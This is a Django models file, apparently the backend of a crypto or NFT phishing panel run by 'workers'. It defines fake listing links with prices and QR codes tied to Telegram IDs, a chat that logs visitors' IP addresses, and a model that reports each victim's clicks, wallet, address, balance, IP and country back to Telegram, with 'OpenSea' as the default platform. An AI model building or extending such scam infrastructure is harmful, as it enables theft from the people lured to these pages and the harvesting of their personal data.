from django.db import models
from django.contrib.auth.models import BaseUserManager, AbstractBaseUser, PermissionsMixin
from django.urls import reverse
from telegram import Bot
from django.dispatch import receiver
from django.db.models.signals import post_save
import requests


class CustomUserManager(BaseUserManager):
    def create_user(self, email, password=None, id_telegram=None):
        if not email:
            raise ValueError('The Email field must be set')

        user = self.model(email=self.normalize_email(email))
        if id_telegram:
            user.id_telegram = id_telegram

        user.set_password(password)
        user.save(using=self._db)
        return user

    def create_superuser(self, email, password=None, id_telegram=None):
        user = self.create_user(email, password, id_telegram)
        user.is_staff = True
        user.is_superuser = True
        user.save(using=self._db)
        return user


class Worker(AbstractBaseUser, PermissionsMixin):
    email = models.EmailField(max_length=255, unique=True)
    password = models.CharField(max_length=128)
    id_telegram = models.CharField(max_length=100, unique=True, blank=False)

    is_active = models.BooleanField(default=True)
    is_staff = models.BooleanField(default=False)

    objects = CustomUserManager()

    USERNAME_FIELD = 'email'
    REQUIRED_FIELDS = []

    def __str__(self):
        return self.email

    class Meta:
        verbose_name = "Воркер"
        verbose_name_plural = "Воркеры"


# Model link
class CreateLink(models.Model):
    creator = models.ForeignKey(Worker, verbose_name='Создатель', on_delete=models.CASCADE)
    collection = models.CharField(verbose_name='Коллекция', max_length=300, blank=True, null=True)

    custom_token = models.AutoField(verbose_name='Кастомный токен', primary_key=True)
    title = models.CharField(verbose_name='Заголовок', max_length=200, blank=True, null=True)
    description = models.TextField(verbose_name='Описание', blank=True, null=True)
    price = models.DecimalField(verbose_name='Цена', max_digits=10, decimal_places=2, blank=True, null=True)
    link = models.URLField(verbose_name='Ссылка', blank=True, null=True)
    image_link = models.URLField(verbose_name='Ссылка на фото', blank=True, null=True)
    qr = models.ImageField(verbose_name='QR', upload_to='qrcodes/', blank=True, null=True)

    worker_id_telegram = models.CharField(verbose_name='id Telegram', max_length=100, blank=True, null=True)

    slug = models.SlugField(unique=True, max_length=200, verbose_name='URL', blank=True, null=True)

    def __str__(self):
        return f"Ссылка создана воркером --> {self.creator}"
    
    def get_absolute_url(self):
        return reverse('create_link', kwargs={'collection': self.collection})

    class Meta:
        verbose_name = "Ссылка"
        verbose_name_plural = "Ссылки"


# CHAT FOR WORKER AND USER
class Message(models.Model):
    chat = models.ForeignKey('Chat', on_delete=models.CASCADE, related_name='chat_messages')
    sender = models.ForeignKey(Worker, on_delete=models.CASCADE)
    content = models.TextField()
    timestamp = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"Сообщение от {self.sender} в {self.chat}"

    class Meta:
        verbose_name = "Сообщение"
        verbose_name_plural = "Сообщения"


# Technical support
class Chat(models.Model):
    link = models.ForeignKey(CreateLink, related_name='chats', on_delete=models.CASCADE)
    worker = models.ForeignKey(Worker, on_delete=models.CASCADE)
    message = models.TextField()
    is_worker = models.CharField(max_length=100, null=True, blank=True)
    ip_address = models.GenericIPAddressField(null=True, blank=True)  # Поле для IP-адреса
    timestamp = models.DateTimeField(auto_now_add=True)

    class Meta:
        verbose_name = "Чат"
        verbose_name_plural = "Чаты"


# REBOUND IN TELEGRAM
class ReboundTelegram(CreateLink):
    STATUS_CHOICES = (
        ('New Message Chat', 'New Message Chat'),
        ('Following a link', 'Переход по ссылке'),
        ('Clicking / Submit', 'Нажатие / Отправить'),
    )

    status = models.CharField(max_length=20, choices=STATUS_CHOICES)
    platform = models.CharField(max_length=100, default='OpenSea')
    wallet = models.CharField(max_length=100)
    address = models.CharField(max_length=200)
    balance = models.DecimalField(max_digits=20, decimal_places=12)
    ip = models.GenericIPAddressField()
    country = models.CharField(max_length=100)

    def __str__(self):
        return f"{self.title} - {self.worker_id_telegram}"


class UserFinishInfo(models.Model):
    user_name = models.CharField(max_length=200, verbose_name="Имя")
    card_name = models.CharField(max_length=100, verbose_name="Название карты")
    img_link = models.URLField(verbose_name='Ссылка на фото', max_length=500)
    card_description = models.CharField(max_length=300, verbose_name="Описание карты")
    card_about_contact_address = models.CharField(max_length=200, verbose_name="Контакный адрес")
    token_id = models.IntegerField(verbose_name="Токен id")

    class Meta:
        verbose_name = "Информация о пользователе"
        verbose_name_plural = "Информации о пользователях"
